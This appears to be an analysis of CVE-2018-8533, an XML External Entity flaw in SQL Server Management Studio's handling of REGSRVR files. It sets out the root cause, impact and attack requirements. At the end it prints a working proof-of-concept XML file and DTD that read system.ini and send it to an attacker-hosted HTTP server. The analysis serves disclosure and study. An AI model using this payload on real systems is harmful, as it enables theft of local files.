Based on the provided information, here's a breakdown of the vulnerability described in relation to CVE-2018-8533:

**Root Cause of Vulnerability:**
- The vulnerability stems from improper handling of XML External Entity (XXE) references within the processing of REGSRVR files by Microsoft SQL Server Management Studio.

**Weaknesses/Vulnerabilities Present:**
- **XML External Entity (XXE) Injection:** The core issue is the lack of proper restrictions on XML External Entity (XXE) references. This allows an attacker to include external entities in the XML document that are then processed by the XML parser.
- The software does not properly sanitize the XML input, allowing for external entities to be resolved.

**Impact of Exploitation:**
- **Information Disclosure:** An attacker can exploit this vulnerability to disclose sensitive information from the system where the SQL Server Management Studio is running. The information can be disclosed from the context of the current process, potentially exposing files, directories, or other data that the user has access to.

**Attack Vectors:**
- **Malicious File:** An attacker can craft a malicious REGSRVR file containing the specially crafted XML.
- **Malicious Page:** The user must be lured into visiting a malicious website that serves a specially crafted REGSRVR file. User interaction is required to trigger the exploit.

**Required Attacker Capabilities/Position:**
- **Remote Position:** The attacker can be remote from the target.
- **User Interaction:** The attacker needs to induce a user to open a malicious REGSRVR file or visit a malicious web page serving it.
- **HTTP Server:**  The attacker needs to host a malicious DTD file and a simple http server is required to provide the payload and handle the exfiltration of information.

**Additional details from the exploit:**

-  The exploit provided uses a DTD file hosted on a simple webserver to load a file from the target machine and send it back via http.

```xml
# 2) "POC.xml"
<?xml version="1.0"?>
<!DOCTYPE injectme [
<!ENTITY % file SYSTEM "C:\Windows\system.ini">
<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/payload.dtd">
%dtd;]>
<pwn>&send;</pwn>

# 3) "payload.dtd"
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>">
%all;
```
This demonstrates the XXE vulnerability by:
1. Loading a local file "C:\Windows\system.ini" via the `%file` entity
2. Loading a remote DTD file "payload.dtd" via the `%dtd` entity
3. Sending the content of the file to a web server via the `send` entity.
